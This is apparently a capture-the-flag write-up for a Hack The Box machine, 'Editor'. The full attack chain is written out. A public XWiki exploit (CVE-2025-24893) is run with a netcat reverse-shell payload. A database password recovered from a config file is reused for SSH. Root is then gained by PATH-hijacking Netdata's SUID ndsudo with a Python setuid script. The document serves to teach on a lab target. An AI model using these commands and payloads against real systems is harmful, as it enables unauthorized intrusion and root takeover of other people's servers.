
`sudo nmap -vvv -Pn -sC -sCV --reason -T4 -p0-65535 10.129.11.169`

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Jetty(10.0.20)
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 
|_/xwiki/bin/logout/
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.11.169:8080/xwiki/bin/view/Main/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We find a web service running  on port 80, Documentation brings us to wiki.editor.htb. This is running a vulnerable version of xwiki which we take over with https://github.com/gunzf0x/CVE-2025-24893 this poc 
`python3 editor.py  -t 'http://wiki.editor.htb' -c 'busybox nc 10.10.15.116 9001 -e /bin/bash'`
We already had a listener set up using netcat `nc -lvnp 9001`

Now we have a shell as xwiki. Time to escalate privs 


`python3 -c 'import pty; pty.spawn("/bin/bash")'` The good old python3 shell upgrade. 


in `var/lib/xwiki` there is one user oliver. We find the password in  - We could have searched for default user location for xwiki 

We find a password in  `/etc/xwiki/hibernate.cfg.xml` - We should have searched for config files to enumerate anything interesting.

```
cat /etc/xwiki/hibernate.cfg.xml |grep -i password                                                                   
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>                                          
    <property name="hibernate.connection.password">xwiki</property>                                                    
    <property name="hibernate.connection.password">xwiki</property>                                                  
    <property name="hibernate.connection.password"></property>                                                        
    <property name="hibernate.connection.password">xwiki</property>                                                  
    <property name="hibernate.connection.password">xwiki</property>                                                  
    <property name="hibernate.connection.password"></property> 
```

we are able to use this username and password to ssh into oliver. 

From there our priv esc can start. 

We start using the command   `find / -perm -4000 -type f 2>/dev/null`

There are a few unique binares but one stands out
```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```
Upon googling ndsudo binary. we see that it is standard with a netdata install and is vulnerable to local priv esc via a path variable take over. 

We will take over via a python script 


```
#!/usr/bin/python3
import os

# Set UID and GID to 0 (root)
os.setgid(0)
os.setuid(0)

# Replace current process with an interactive bash shell
os.execv("/bin/bash", ["bash", "-i"])
```

This simple script will import os functions. Set our guid and suid to root and run an interactive bash shell

`export PATH=~:$PATH ` is a command that adds our home directory to the path variable 

`/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h` Is a command that shows the commands we can take over 
```
opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme 
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme 
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli 
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli 
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
```

We create an executable file name nvme to take over the nvme-list command 

`nano nvme` > paste our python file `chmod +x nvme` > `Export PATH=~:$PATH` to add our user directory to the path variables. 

`/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`
To run our file! and get root!!!.


## Conclusion 

This room was a 2 step attack chain leveraging a vulnerable documentation app on editor.htb web app.  https://github.com/gunzf0x/CVE-2025-24893 > User enumeration > https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93

We first navigated to the page and found a subdomain wiki.editor.htb. From there we saw it was running a vulnerable version of X wiki. We made use of an existing POC to take over the server as the Xwiki user. From there we enumerating login creds and a user from config files on the server. We were able to use the creds to get a user session. From there we used a priv esc technique vulnerability in the ndsudo binary that ships with netdata. We used a python script running in place of this binary to get a shell as root. This is an example of a PATH injection attack. Where we are able to substitute our own binary in front of another one to get our code to run first 